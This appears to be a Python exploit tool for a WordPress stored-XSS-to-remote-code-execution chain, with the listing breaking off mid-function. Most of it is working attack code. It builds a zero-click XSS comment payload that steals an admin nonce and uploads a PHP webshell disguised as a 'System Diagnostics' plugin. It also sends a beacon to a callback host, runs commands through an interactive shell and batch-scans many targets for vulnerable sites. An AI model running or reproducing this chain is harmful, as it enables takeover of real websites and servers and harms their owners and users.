#!/usr/bin/env python3
"""
Comment2Shell - CVE-2026-93485
WordPress Core: Pre-Auth Stored XSS in wpautop() -> Admin Session -> RCE

CVSS 7.1 | CWE-79 | Affects WP 4.7.0 - 7.1.0 | Fixed in 7.1.1

Modes:
  --scan    Passive version fingerprint (safe, no payload submitted)
  --probe   Submit benign detection comment (safe XSS proof)
  -c CMD    Full exploit chain -> execute command on server
  --shell   Interactive post-exploitation shell
  --ioc     Check target for signs of Comment2Shell exploitation

Author: 0xDeathShotX_X (github.com/DeathShotXD)
License: MIT
"""

import argparse
import html
import json
import os
import random
import re
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

VULN_MIN = (4, 7, 0)
VULN_MAX = (7, 1, 0)
PATCHED_7_1 = (7, 1, 1)

# Branch-specific patch thresholds: version < (major, minor, threshold) is vulnerable.
# From WordPress 7.1.1 security release backport table.
BRANCH_PATCH_THRESHOLD = {
    (4, 7): 36, (4, 8): 31, (4, 9): 32,
    (5, 0): 28, (5, 1): 25, (5, 2): 27, (5, 3): 24, (5, 4): 22,
    (5, 5): 21, (5, 6): 20, (5, 7): 18, (5, 8): 16, (5, 9): 17,
    (6, 0): 15, (6, 1): 13, (6, 2): 12, (6, 3): 11, (6, 4): 11,
    (6, 5): 11, (6, 6): 8, (6, 7): 8, (6, 8): 9, (6, 9): 8,
    (7, 0): 5, (7, 1): 1,
}

C_RED = "\033[91m"
C_GRN = "\033[92m"
C_YLW = "\033[93m"
C_CYN = "\033[96m"
C_BLD = "\033[1m"
C_RST = "\033[0m"

if not sys.stdout.isatty():
    C_RED = C_GRN = C_YLW = C_CYN = C_BLD = C_RST = ""


def log(level, msg):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    colors = {"ok": C_GRN, "vuln": C_RED, "info": C_CYN, "warn": C_YLW, "err": C_RED}
    labels = {"ok": " OK ", "vuln": "VULN", "info": "INFO", "warn": "WARN", "err": "FAIL"}
    c = colors.get(level, "")
    print(f"{c}[{ts}] [{labels.get(level, level.upper())}]{C_RST} {msg}", flush=True)


def rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


# -- Version Detection --------------------------------------------------------

def parse_version(text):
    m = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", text)
    if m:
        return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))
    return None


def is_vulnerable(ver):
    if not ver:
        return None
    # Check branch-specific patch threshold first (most precise)
    branch = (ver[0], ver[1])
    if branch in BRANCH_PATCH_THRESHOLD:
        return ver[2] < BRANCH_PATCH_THRESHOLD[branch]
    # Unknown branch: check if within overall affected range
    return VULN_MIN <= ver <= VULN_MAX


def detect_version(base_url, timeout=10):
    """Passive WordPress version fingerprinting."""
    methods = [
        ("readme.html", re.compile(r"Version\s+(\d+\.\d+(?:\.\d+)?)")),
        ("wp-includes/version.php", re.compile(r"wp_version\s*=\s*['\"](\d+\.\d+(?:\.\d+)?)")),
        ("", re.compile(r'<meta\s+name="generator"\s+content="WordPress\s+(\d+\.\d+(?:\.\d+)?)"')),
    ]
    for path, pattern in methods:
        try:
            url = f"{base_url}/{path}" if path else base_url
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(65536).decode("utf-8", errors="ignore")
                m = pattern.search(body)
                if m:
                    return parse_version(m.group(1)), path or "generator-meta"
        except Exception:
            continue
    return None, None


def find_post_id(base_url, timeout=10):
    """Discover a commentable post ID (prefers comment_status=open)."""
    # Method 1: REST API - prefer posts that actually accept comments
    try:
        url = f"{base_url}/wp-json/wp/v2/posts?per_page=20&status=publish"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            data = json.loads(resp.read().decode())
        if isinstance(data, list):
            for post in data:
                if post.get("comment_status") == "open" and post.get("id"):
                    return int(post["id"])
            # Fallback: any published post if none open (submit may still work)
            if data and data[0].get("id"):
                return int(data[0]["id"])
    except Exception:
        pass

    # Method 2: Scan homepage HTML for patterns
    try:
        req = urllib.request.Request(
            base_url,
            headers={"User-Agent": "Mozilla/5.0 (compatible; Comment2Shell/1.0)"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(200000).decode("utf-8", errors="ignore")
        for pattern in [
            re.compile(r'\?p=(\d+)'),
            re.compile(r'/\?p=(\d+)'),
            re.compile(r'postid-(\d+)'),
            re.compile(r'/wp-json/wp/v2/posts/(\d+)'),
            re.compile(r'href="[^"]*/(\d{4}/\d{2}/\d{2}/[^"]+)"'),  # pretty permalinks
            re.compile(r'/page/\d+/\?p=(\d+)'),
        ]:
            m = pattern.search(body)
            if m:
                if m.lastindex:  # pattern captured a group
                    try:
                        return int(m.group(1))
                    except (ValueError, IndexError):
                        pass
                else:
                    # Pretty permalink found - try to extract ID from REST
                    pass
    except Exception:
        pass

    # Method 3: Try RSS/Atom feed
    for feed_path in ("/feed/", "/rss/", "/atom.xml", "/?feed=rss2"):
        try:
            url = f"{base_url}{feed_path}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read(50000).decode("utf-8", errors="ignore")
            # Look for post links in feed
            for pattern in [
                re.compile(r'\?p=(\d+)'),
                re.compile(r'/wp-json/wp/v2/posts/(\d+)'),
                re.compile(r'<dc:identifier>post-(\d+)</dc:identifier>'),
            ]:
                m = pattern.search(body)
                if m:
                    return int(m.group(1))
        except Exception:
            continue

    # Method 4: Fallback to common IDs
    for fallback in (1, 2, 3):
        try:
            url = f"{base_url}/?p={fallback}"
            req = urllib.request.Request(url, method="HEAD")
            with urllib.request.urlopen(req, timeout=5) as resp:
                if resp.status == 200:
                    return fallback
        except Exception:
            continue
    return None


# -- Payload Construction -----------------------------------------------------

def build_detection_js(callback_url=None):
    """Benign detection payload - proof of XSS without touching admin APIs."""
    if callback_url:
        esc_cb = callback_url.replace('"', '\\"')
        beacon = (
            f'fetch("{esc_cb}?hit="+encodeURIComponent(location.host),'
            f'{{method:"GET"}}).catch(function(){{}});'
        )
    else:
        beacon = 'document.title="C2S_XSS_"+document.domain;'
    return f"(function(){{{beacon}}})()"


def _js_string_from_chars(s):
    """Convert a Python string to a JS String.fromCharCode(...) call."""
    codes = ",".join(str(ord(c)) for c in s)
    return f"String.fromCharCode({codes})"


def build_rce_js(callback_url=None, shell_path=None, marker=None):
    """
    Full RCE chain JS - runs in admin session when the post is viewed.
    Extracts plugin-upload nonce -> builds stored ZIP -> uploads webshell.

    Constraint: must contain NO single quotes (HTML attribute delimiter).
    All JS strings use double quotes.
    """
    # Use provided shell_path if given (keeps Python/JS in sync),
    # otherwise generate a random one.
    if shell_path and "/" in shell_path:
        plugin_dir = shell_path.split("/", 1)[0]
    else:
        plugin_dir = rand_str(6)
    shell_file = f"{plugin_dir}/{plugin_dir}.php"

    # PHP webshell built as a single string, then converted via String.fromCharCode
    # to avoid any quote conflicts in the JS/HTML context.
    # MUST include a Plugin Name header - WordPress Plugin_Upgrader rejects
    # packages without one ("No valid plugins were found").
    # ?m=marker  ?c=command  ?d=1 self-delete (cleanup)
    if marker:
        php_source = (
            '<?php\n'
            '/**\n'
            ' * Plugin Name: System Diagnostics\n'
            ' * Description: Health check utility\n'
            ' * Version: 1.0.0\n'
            ' */\n'
            f'if(isset($_GET["m"])){{echo "{marker}";}}'
            'if(isset($_GET["d"])){$f=__FILE__;@unlink($f);@rmdir(dirname($f));echo "CLEANED";exit;}\n'
            f'if(isset($_GET["c"])){{system($_GET["c"]);}}'
        )
    else:
        php_source = (
            '<?php\n'
            '/**\n'
            ' * Plugin Name: System Diagnostics\n'
            ' * Description: Health check utility\n'
            ' * Version: 1.0.0\n'
            ' */\n'
            'if(isset($_GET["d"])){$f=__FILE__;@unlink($f);@rmdir(dirname($f));echo "CLEANED";exit;}\n'
            'if(isset($_GET["c"])){system($_GET["c"]);}'
        )
    php_codes = [ord(c) for c in php_source]
    php_js = f"var php=String.fromCharCode({','.join(str(c) for c in php_codes)});"

    # OAST beacon (after successful upload)
    beacon_line = ""
    if callback_url and shell_path:
        esc_cb = callback_url.replace('"', '\\"')
        esc_sp = shell_path.replace('"', '\\"')
        beacon_line = (
            f'fetch("{esc_cb}?host="+encodeURIComponent(location.host)'
            f'+"&shell="+encodeURIComponent("{esc_sp}"),'
            f'{{method:"GET"}}).catch(function(){{}});'
        )
    elif callback_url:
        esc_cb = callback_url.replace('"', '\\"')
        beacon_line = (
            f'fetch("{esc_cb}?host="+encodeURIComponent(location.host),'
            f'{{method:"GET"}}).catch(function(){{}});'
        )

    # plugin_dir as JS chars
    dir_js = _js_string_from_chars(plugin_dir)

    # Build JS as a list of parts, then join (avoids implicit-concat issues)
    parts = [
        "(function(){",
        # Run once. Dismissing alert() returns focus to the autofocused
        # blockquote, which fires onfocus again; without this guard the
        # alert loops forever and the async upload chain never completes.
        # Double quotes only (single quotes delimit the HTML attribute).
        "if(window.c2s){return;}window.c2s=1;",
        # 0. Visible PoC alert, proves XSS fired on manual validation.
        'alert("Comment2Shell XSS - CVE-2026-93485");',
        'document.title="Comment2Shell: XSS fired";',
        # 1. Fetch plugin upload page, extract nonce
        'fetch("/wp-admin/plugin-install.php?tab=upload",{credentials:"include"})',
        ".then(function(r){return r.text()})",
        ".then(function(h){",
        'var m=h.match(/name="_wpnonce"\\s+value="([^"]+)"/);',
        "if(!m){",
        'document.title="Comment2Shell: admin login required";',
        'console.error("Comment2Shell: no nonce - viewer is not logged in as admin");',
        "return;}",
        "var n=m[1];",
        # 2. CRC32 for ZIP
        "function crc32(b){",
        "var t=[],i,j,c;",
        "for(i=0;i<256;i++){c=i;for(j=0;j<8;j++){c=(c&1)?(0xEDB88320^(c>>>1)):(c>>>1);}t[i]=c;}",
        "var crc=0xFFFFFFFF;",
        "for(i=0;i<b.length;i++){crc=t[(crc^b[i])&0xFF]^(crc>>>8);}",
        "return(crc^0xFFFFFFFF)>>>0;}",
        # 3. String encoder
        "function enc(s){var a=new Uint8Array(s.length);",
        "for(var i=0;i<s.length;i++){a[i]=s.charCodeAt(i)&0xFF;}return a;}",
        # 4. ZIP builder (stored, no compression)
        "function buildZip(name,content){",
        "var nb=enc(name),cb=enc(content),crc=crc32(cb);",
        "var lh=new ArrayBuffer(30+nb.length);",
        "var lv=new DataView(lh);",
        "lv.setUint32(0,0x04034b50,true);lv.setUint16(4,20,true);",
        "lv.setUint32(14,crc,true);lv.setUint32(18,cb.length,true);",
        "lv.setUint32(22,cb.length,true);lv.setUint16(26,nb.length,true);",
        "var la=new Uint8Array(lh);la.set(nb,30);",
        "var cdh=new ArrayBuffer(46+nb.length);",
        "var cv=new DataView(cdh);",
        "cv.setUint32(0,0x02014b50,true);cv.setUint16(4,20,true);",
        "cv.setUint16(6,20,true);cv.setUint32(16,crc,true);",
        "cv.setUint32(20,cb.length,true);cv.setUint32(24,cb.length,true);",
        "cv.setUint16(28,nb.length,true);cv.setUint32(42,0,true);",
        "var ca=new Uint8Array(cdh);ca.set(nb,46);",
        "var eo=new ArrayBuffer(22);var ev=new DataView(eo);",
        "ev.setUint32(0,0x06054b50,true);",
        "ev.setUint16(8,1,true);ev.setUint16(10,1,true);",
        "ev.setUint32(12,cdh.byteLength,true);",
        "ev.setUint32(16,lh.byteLength+cb.length,true);",
        "var out=new Uint8Array(lh.byteLength+cb.length+cdh.byteLength+22);",
        "out.set(la,0);out.set(cb,lh.byteLength);",
        "out.set(ca,lh.byteLength+cb.length);",
        "out.set(new Uint8Array(eo),lh.byteLength+cb.length+cdh.byteLength);",
        "return out;}",
        # 5. PHP payload
        php_js,
        # 6. Plugin filename (random dir)
        f"var d={dir_js};",
        'var fn=d+"/"+d+".php";',
        "var z=buildZip(fn,php);",
        # 7. Upload
        "var fd=new FormData();",
        'fd.append("_wpnonce",n);',
        'fd.append("pluginzip",new Blob([z],{type:"application/zip"}),d+".zip");',
        'fetch("/wp-admin/update.php?action=upload-plugin",',
        '{method:"POST",credentials:"include",body:fd})',
        ".then(function(){",
        'document.title="Comment2Shell: shell uploaded";',
        beacon_line,
        "}).catch(function(e){console.error(\"Comment2Shell: upload failed\",e);});",
        "}).catch(function(e){console.error(\"Comment2Shell: nonce fetch failed\",e);});",
        "})();",
    ]
    return "".join(parts)


def build_xss_comment(js_code, use_single_quotes=True):
    """
    Build the Comment2Shell XSS payload.

    Attack chain (CVE-2026-93485):
      1. Leading "x\\n\\n" forces wpautop to wrap the blockquote in its own
         <p> paragraph -> creates the <p><blockquote pattern.
      2. Newline inside cite becomes <!-- wpnl --> (wp_replace_in_html_tags).
      3. Vulnerable regex |<p><blockquote([^>]*)>|i stops at the > inside
         <!-- wpnl --> and injects <p> INTO the cite attribute.
      4. wptexturize converts the closing cite " to &#8221; (curly quote),
         leaving the attribute unclosed.
      5. Browser parses onfocus/autofocus/tabindex as real attributes.
      6. autofocus fires onfocus on page load - zero-click.

    Critical: < > & in JS must be HTML-entity-encoded, otherwise KSES's
    HTML parser misreads them as tag delimiters and corrupts the attribute
    boundary (converting the closing ' to &#039;). Browsers decode entities
    in attribute values before passing to the JS engine, so encoding is
    transparent to execution.
    """
    if "'" in js_code:
        raise ValueError("JS payload must not contain single quotes (HTML attr conflict)")

    # HTML-entity-encode < > & (order matters: & first would double-encode,
    # so we do it in one pass via translate/maketrans)
    js_encoded = js_code.translate(str.maketrans({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
    }))

    nl = "\n"
    return (
        f'x{nl}{nl}'
        f'<blockquote cite="a{nl}b">'
        f'<code>x" onfocus=\'{js_encoded}\' autofocus tabindex=0'
        f'</code></blockquote>'
    )


# -- Comment Submission -------------------------------------------------------

def submit_comment(base_url, post_id, content, name=None, email=None, url="",
                   timeout=15, proxy=None):
    """Submit a comment to wp-comments-post.php. Returns (response_info)."""
    name = name or rand_str(10)
    email = email or f"{rand_str(8)}@{rand_str(6)}.com"

    data = urllib.parse.urlencode({
        "comment_post_ID": str(post_id),
        "comment": content,
        "author": name,
        "email": email,
        "url": url,
        "comment_parent": "0",
        "submit": "Post Comment",
    }).encode("utf-8")

    target = f"{base_url}/wp-comments-post.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"{base_url}/?p={post_id}",
        "Origin": base_url,
    }

    result = {
        "status": None, "location": None, "body": "",
        "approved": False, "pending": False, "failed": False,
        "author": name, "email": email,
    }

    try:
        req = urllib.request.Request(target, data=data, headers=headers, method="POST")

        # Don't follow redirects so we can inspect Location header
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None

        handlers = [NoRedirect()]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({
                "http": proxy, "https": proxy
            }))
        opener = urllib.request.build_opener(*handlers)

        try:
            resp = opener.open(req, timeout=timeout)
            result["status"] = resp.status
            result["body"] = resp.read(65536).decode("utf-8", errors="ignore")
        except urllib.error.HTTPError as e:
            result["status"] = e.code
            result["location"] = e.headers.get("Location", "")
            result["body"] = e.read(65536).decode("utf-8", errors="ignore") if e.fp else ""

        loc = result.get("location") or ""
        if result["status"] in (301, 302, 303, 307, 308):
            if "unapproved=" in loc or "moderation-hash" in loc:
                result["pending"] = True
                result["approved"] = False
            elif "#comment-" in loc:
                result["approved"] = True
            else:
                result["pending"] = True
        elif result["status"] == 200:
            body_lower = result["body"].lower()
            if "awaiting moderation" in body_lower or "moderated" in body_lower:
                result["pending"] = True
            elif "duplicate" in body_lower:
                result["failed"] = True
            elif "error" in body_lower and "comment" in body_lower:
                result["failed"] = True
        elif result["status"] == 403:
            result["failed"] = True
            if "closed" in result["body"].lower():
                result["error"] = "Comments are closed"

    except Exception as e:
        result["failed"] = True
        result["error"] = str(e)

    return result


def submit_as_known_commenter(base_url, post_id, content, timeout=15, proxy=None):
    """Attempt approval bypass using default 'A WordPress Commenter' identity."""
    return submit_comment(
        base_url, post_id, content,
        name="A WordPress Commenter",
        email="wapuu@wordpress.example",
        url="https://wordpress.org/",
        timeout=timeout, proxy=proxy,
    )


# -- Shell Client -------------------------------------------------------------

def exec_command(base_url, shell_path, cmd, timeout=15, proxy=None):
    """Execute command via uploaded webshell."""
    # Normalize: accept both "dir/dir.php" and "wp-content/plugins/dir/dir.php"
    if shell_path.startswith("wp-content/plugins/"):
        rel_path = shell_path[len("wp-content/plugins/"):]
    elif shell_path.startswith("wp-content/"):
        rel_path = shell_path[len("wp-content/"):]
    else:
        rel_path = shell_path
    url = f"{base_url}/wp-content/plugins/{rel_path}?c={urllib.parse.quote(cmd)}"

    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)

    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0",
        "Referer": base_url,
    })

    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.read(524288).decode("utf-8", errors="ignore")
    except Exception as e:
        return f"__ERROR__: {e}"


def verify_shell(base_url, shell_path, timeout=10, proxy=None):
    """Check if the webshell is reachable."""
    out = exec_command(base_url, shell_path, "id", timeout=timeout, proxy=proxy)
    if out.startswith("__ERROR__"):
        return False, out
    if "uid=" in out or "www-data" in out or "wordpress" in out or len(out.strip()) > 0:
        return True, out.strip()
    return False, out.strip()


def cleanup_shell(base_url, shell_path, proxy=None, timeout=10):
    """
    Self-delete the webshell: hits ?d=1 which unlinks the PHP file and
    removes the plugin directory. Falls back to rm -rf via the shell.
    Returns True if cleaned.
    """
    if shell_path.startswith("wp-content/plugins/"):
        rel_path = shell_path[len("wp-content/plugins/"):]
    elif shell_path.startswith("wp-content/"):
        rel_path = shell_path[len("wp-content/"):]
    else:
        rel_path = shell_path

    # Primary: self-delete endpoint baked into the shell
    url = f"{base_url}/wp-content/plugins/{rel_path}?d=1"
    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", errors="ignore")
        if "CLEANED" in body:
            return True
    except Exception:
        pass

    # Fallback: rm -rf via shell (in case ?d=1 endpoint missing)
    plugin_dir = rel_path.split("/", 1)[0]
    for cmd in (f"rm -rf {plugin_dir}",):
        out = exec_command(base_url, rel_path, cmd, timeout=timeout, proxy=proxy)
        if not out.startswith("__ERROR__"):
            # Verify gone
            ok, _ = verify_shell(base_url, rel_path, timeout=5, proxy=proxy)
            if not ok:
                return True
    return False


# -- IOC Checker --------------------------------------------------------------

def check_ioc_remote(base_url, timeout=10, proxy=None):
    """
    Remote IOC check without server log access.

    Returns (findings, notes). Findings are suspected compromises; notes
    describe checks that could not run, such as the plugin directory
    listing being disabled, which is the default on WordPress.
    """
    findings = []
    notes = []

    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)

    dirs = []
    url = f"{base_url}/wp-content/plugins/"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(65536).decode("utf-8", errors="ignore")
        dirs = re.findall(r'href="([^"?/]+)/"', body)
    except urllib.error.HTTPError as e:
        if e.code in (403, 404):
            notes.append(f"Plugin directory listing disabled (HTTP {e.code})")
        else:
            notes.append(f"Plugin listing request failed (HTTP {e.code})")
    except Exception as e:
        notes.append(f"Plugin listing request failed: {e}")

    # Look for single-file plugin directories. The tool's payloads use a
    # six character [a-z0-9] directory holding a same-name PHP file, but
    # any short random directory is worth probing.
    for d in dirs:
        if d in ("akismet", "hello.php", "hello-dolly", "index.php"):
            continue
        if not re.fullmatch(r"[a-z0-9]+", d):
            continue
        if len(d) <= 2:
            findings.append(f"Suspicious short plugin dir: wp-content/plugins/{d}/")
        if len(d) <= 6:
            probe = f"{base_url}/wp-content/plugins/{d}/{d}.php?c=id"
            try:
                req2 = urllib.request.Request(probe, headers={"User-Agent": "Mozilla/5.0"})
                with opener.open(req2, timeout=5) as r2:
                    if "uid=" in r2.read(4096).decode("utf-8", errors="ignore"):
                        findings.append(f"ACTIVE WEBSHELL: {probe}")
            except Exception:
                pass

    return findings, notes


# -- Scanner ------------------------------------------------------------------

def scan_single(target, timeout=10, proxy=None, verbose=False):
    """Scan a single target. Returns dict."""
    base = normalize_url(target)
    result = {"target": base, "version": None, "vulnerable": None,
              "wordpress": False, "error": None, "post_id": None}

    ver, method = detect_version(base, timeout=timeout)
    if ver:
        result["wordpress"] = True
        result["version"] = ".".join(map(str, ver))
        result["vulnerable"] = is_vulnerable(ver)
        result["version_method"] = method

    # If no version found, check if it's WordPress at all
    if not result["wordpress"]:
        try:
            req = urllib.request.Request(f"{base}/wp-login.php",
                                         headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                if resp.status == 200:
                    body = resp.read(32768).decode("utf-8", errors="ignore")
                    if "wordpress" in body.lower() or "wp-submit" in body:
                        result["wordpress"] = True
                        result["version"] = "unknown"
                        result["vulnerable"] = None  # unknown version
        except Exception:
            pass

    if result["wordpress"]:
        pid = find_post_id(base, timeout=timeout)
        result["post_id"] = pid

    return result


def run_scan(targets, threads=10, timeout=10, proxy=None):
    """Batch scan multiple targets."""
    results = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(scan_single, t, timeout, proxy): t for t in targets}
        for fut in as_completed(futures):
            try:
                r = fut.result()
                results.append(r)
                if r["vulnerable"] is True:
                    log("vuln", f"{r['target']}  WP {r['version']}  [VULNERABLE]")
                elif r["wordpress"] and r["vulnerable"] is None:
                    log("warn", f"{r['target']}  WP (version unknown)  [?]")
                elif r["wordpress"]:
                    log("info", f"{r['target']}  WP {r['version']}  [patched/unknown]")
                else:
                    if "--verbose" in sys.argv or "-v" in sys.argv:
                        log("info", f"{r['target']}  not WordPress")
            except Exception as e:
                log("err", f"{futures[fut]}: {e}")
    return results


# -- Interactive Shell --------------------------------------------------------

def interactive_shell(base_url, shell_path, proxy=None):
    """Interactive command execution loop."""
    print(f"\n{C_GRN}[+]{C_RST} Connected to shell at {base_url}/wp-content/plugins/{shell_path}")
    print(f"{C_CYN}[i]{C_RST} Type commands, 'exit' or Ctrl+C to quit\n")

    # Verify first
    ok, out = verify_shell(base_url, shell_path, proxy=proxy)
    if ok:
        print(f"{C_GRN}[+]{C_RST} Shell verified: {out.split(chr(10))[0]}")
    else:
        print(f"{C_YLW}[!]{C_RST} Could not verify shell (may still work): {out}")

    while True:
        try:
            cmd = input(f"{C_BLD}Comment2Shell$ {C_RST}").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "q"):
                print("Bye.")
                break
            if cmd == "clear":
                os.system("clear" if os.name != "nt" else "cls")
                continue
            result = exec_command(base_url, shell_path, cmd, proxy=proxy)
            if result.startswith("__ERROR__"):
                print(f"{C_RED}{result}{C_RST}")
            else:
                print(result, end="" if result.endswith("\n") else "\n")
        except KeyboardInterrupt:
            print("\nBye.")
            break
        except EOFError:
            break


# -- Main Exploit Flow --------------------------------------------------------

def find_live_payload_path(base_url, post_id, timeout=15, proxy=None):
    """
    Return the shell path of the first XSS payload on the rendered post.

    Only the first element with autofocus gets focus, so if older payload
    comments are still present the browser runs the oldest one, not the
    comment we just submitted. Reading the post tells us which path will
    actually be uploaded, so we can poll the right one.
    """
    url = f"{base_url}/?p={post_id}&c2s={rand_str(6)}"
    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    })
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(1048576).decode("utf-8", errors="ignore")
    except Exception:
        return None

    m = re.search(r"onfocus='([^']*)'", body)
    if not m:
        return None

    js = html.unescape(m.group(1))
    d = re.search(r"var d=String\.fromCharCode\(([0-9,]+)\)", js)
    if not d:
        return None
    try:
        shell_dir = "".join(chr(int(x)) for x in d.group(1).split(","))
    except (ValueError, OverflowError):
        return None
    if not re.fullmatch(r"[A-Za-z0-9]{1,32}", shell_dir):
        return None
    return f"{shell_dir}/{shell_dir}.php"


def run_exploit(base_url, command, callback=None, timeout=15, proxy=None,
                use_known_commenter=False, post_id=None, quiet=False,
                wait=45, cleanup=True):
    """
    Full exploit chain:
    1. Detect version (verify vulnerable)
    2. Find post ID
    3. Build XSS payload with RCE JS (random shell name)
    4. Submit comment
    5. Poll for webshell (admin triggers XSS -> shell appears)
    6. Execute command
    7. Auto-cleanup (self-delete shell) unless cleanup=False
    """
    base_url = normalize_url(base_url)

    if not quiet:
        log("info", f"Target: {base_url}")
        log("info", f"Mode: Full exploit chain")

    # Step 1: Version check
    ver, method = detect_version(base_url, timeout=timeout)
    if ver:
        vuln = is_vulnerable(ver)
        if vuln is False:
            log("ok", f"WordPress {'.'.join(map(str, ver))} - PATCHED (not vulnerable)")
            if ver >= PATCHED_7_1:
                log("info", "Patched in 7.1.1 - CVE-2026-93485 not applicable")
                return {"success": False, "reason": "patched", "version": ".".join(map(str, ver))}
        elif vuln:
            log("vuln", f"WordPress {'.'.join(map(str, ver))} - VULNERABLE to CVE-2026-93485")
        else:
            log("warn", "Version could not be confirmed - proceeding")
    else:
        log("warn", "Could not detect WordPress version - proceeding anyway")

    # Step 2: Find post ID
    if not post_id:
        post_id = find_post_id(base_url, timeout=timeout)
    if not post_id:
        log("err", "Could not find a commentable post ID")
        return {"success": False, "reason": "no_post_id"}
    log("info", f"Target post ID: {post_id}")

    # Step 3: Generate random shell path
    shell_dir = rand_str(6)
    shell_path = f"{shell_dir}/{shell_dir}.php"
    marker = "C2S_" + rand_str(8)

    log("info", f"Webshell path: wp-content/plugins/{shell_path}")
    log("info", f"Verification marker: {marker}")

    # Step 4: Build XSS payload
    js = build_rce_js(callback_url=callback, shell_path=shell_path, marker=marker)
    if "'" in js:
        # Fallback: if JS contains single quotes, use detection payload only
        log("warn", "JS payload contains single quotes - using detection payload")
        js = build_detection_js(callback_url=callback)

    try:
        payload = build_xss_comment(js)
    except ValueError as e:
        log("err", f"Payload construction failed: {e}")
        return {"success": False, "reason": "payload_error"}

    if not quiet:
        log("info", f"Payload length: {len(payload)} bytes")

    # Step 5: Submit comment
    log("info", "Submitting comment with XSS payload...")

    result = submit_comment(base_url, post_id, payload,
                            timeout=timeout, proxy=proxy)

    if result.get("error") and result.get("failed"):
        # Try known commenter bypass
        if not use_known_commenter:
            log("warn", "First attempt failed - trying known commenter bypass...")
            result = submit_as_known_commenter(base_url, post_id, payload,
                                               timeout=timeout, proxy=proxy)

    if result.get("failed"):
        log("err", f"Comment submission failed: {result.get('error', 'unknown')}")
        return {"success": False, "reason": "submit_failed", "detail": result}

    if result.get("approved"):
        log("ok", "Comment APPROVED - XSS payload is live!")
    elif result.get("pending"):
        log("warn", "Comment PENDING moderation")
        loc = result.get("location", "")
        if "unapproved=" in loc:
            preview_url = f"{base_url}/?p={post_id}&{loc.split('?')[1] if '?' in loc else ''}"
            log("info", f"Author preview URL: {preview_url}")
        log("info", "Admin will see this in moderation queue / frontend when they visit")
    else:
        log("warn", f"Comment submitted (status: {result.get('status')})")

    # The browser only focuses the first autofocus element on the page. If
    # an older payload comment is still present it runs instead of ours, so
    # poll the path that will actually be uploaded.
    live_path = find_live_payload_path(base_url, post_id, timeout=timeout, proxy=proxy)
    if live_path and live_path != shell_path:
        log("info", f"Older live payload detected, polling {live_path}")
        shell_path = live_path

    # Step 6: Poll for webshell, execute, cleanup
    print()
    log("info", "=" * 60)
    if callback:
        log("info", f"OAST callback: {callback}?host=...&shell=...")
    log("info", f"Waiting for admin to view {base_url}/?p={post_id}")
    log("info", "The viewing browser must be logged in as admin:")
    log("info", f"  1. Open {base_url}/wp-login.php and log in")
    log("info", f"  2. Then open {base_url}/?p={post_id}")
    if wait > 0:
        log("info", f"Polling webshell every 3s ({wait}s max)...")
    log("info", "=" * 60)
    print()

    shell_live = False
    if wait > 0:
        deadline = time.time() + wait
        attempt = 0
        while time.time() < deadline:
            attempt += 1
            ok, out = verify_shell(base_url, shell_path, proxy=proxy)
            if ok:
                shell_live = True
                log("vuln", f"SHELL IS LIVE! {out.split(chr(10))[0]}")
                break
            if attempt == 1:
                log("info", "  ...waiting for admin trigger (alert will pop in their browser)")
            elif attempt % 5 == 0:
                remaining = int(deadline - time.time())
                log("info", f"  ...still waiting ({remaining}s left)")
            time.sleep(3)

    if not shell_live:
        # One last direct check (shell may have been planted earlier)
        ok, out = verify_shell(base_url, shell_path, proxy=proxy)
        shell_live = ok
        if ok:
            log("vuln", f"SHELL IS LIVE! {out.split(chr(10))[0]}")

    if not shell_live:
        log("warn", "Shell not detected - admin may not have visited the post yet")
        print()
        print(f"  Admin must visit: {C_CYN}{base_url}/?p={post_id}{C_RST}")
        print(f"  Then re-run with: {C_CYN}-t {base_url} -c \"{command or 'id'}\" --wait 10{C_RST}")
        print(f"  Or poll existing: {C_CYN}--exec -t {base_url} --shell-path {shell_path} -c \"id\"{C_RST}")
        return {
            "success": False, "reason": "awaiting_admin",
